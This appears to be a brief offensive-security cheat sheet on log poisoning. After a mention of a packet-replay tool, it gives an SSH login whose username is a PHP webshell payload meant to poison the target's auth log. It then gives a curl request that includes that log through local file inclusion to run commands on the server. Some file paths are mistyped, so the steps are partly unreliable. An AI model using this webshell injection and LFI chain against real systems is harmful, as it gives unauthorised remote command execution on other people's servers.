# Log Poisoning

**Colasoft** **Packet Player**

Is a packet replayer which allows users to open captured packet trace files and play them back in the network

Can replay fake traffic into a connected network.

[http://www.colasoft.com/packet\_player/](http://www.colasoft.com/packet_player/)

**Scenario:**

Ports 22 & 80

can view /var/log.auth.log on port 80

```
ssh "<?php echo system($_GET['cmd']);?>"@TARGETIPADDRESS
```

Call the webshell through the viewable log with in this case is viewable by LFI

Below view working directory, current user and lists contents of directory

```
curl 'http://TARGETIPADDRESS/index.php?file=%2fcar%2flog%2fauth.log&cmd=pwd;id;ls%20-lah'
```



